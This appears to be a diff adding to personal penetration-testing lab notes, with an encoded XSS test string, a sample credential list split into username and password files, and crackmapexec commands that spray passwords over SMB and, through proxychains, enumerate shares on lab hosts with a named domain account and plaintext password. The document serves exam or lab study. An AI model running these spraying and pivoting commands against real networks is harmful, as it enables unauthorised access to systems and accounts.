@@ -140,6 +140,30 @@ DESCRIPTION
 String.fromCharCode(97,108,101,114,116,40,49,41)
 ```
 
+```
+user1:password1
+user2:password2
+user3:password3
+user4:password4
+user5:password5
+```
 
+```
+cat credentials.txt | cut -d ':' -f 1 > usernames.txt
+```
 
+```
+cat credentials.txt | cut -d ':' -f 2 > passwords.txt
+```
 
+![](Pasted%20image%2020231024125817.png)
+
+```
+crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt -d 
+--continue-on-success
+```
+
+```
+proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u
+john -d beyond.com -p "dqsTwTpZPn#nL" --shares
+```
